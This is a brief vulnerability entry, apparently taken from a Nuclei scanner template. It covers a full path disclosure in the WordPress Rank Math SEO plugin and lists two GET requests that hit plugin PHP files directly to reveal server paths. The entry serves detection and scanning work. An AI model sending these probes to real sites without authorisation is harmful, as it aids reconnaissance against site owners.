# Vulnerability: WordPress SEO Plugin Rank Math - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-rank-math-seo-fpd.yaml`)

## Description
WordPress Rank Math SEO plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/seo-by-rank-math/vendor/developer/developer.php
GET {{BaseURL}}/wp-content/plugins/seo-by-rank-math/vendor/woocommerce/action-scheduler/classes/ActionScheduler_AdminView.php
```

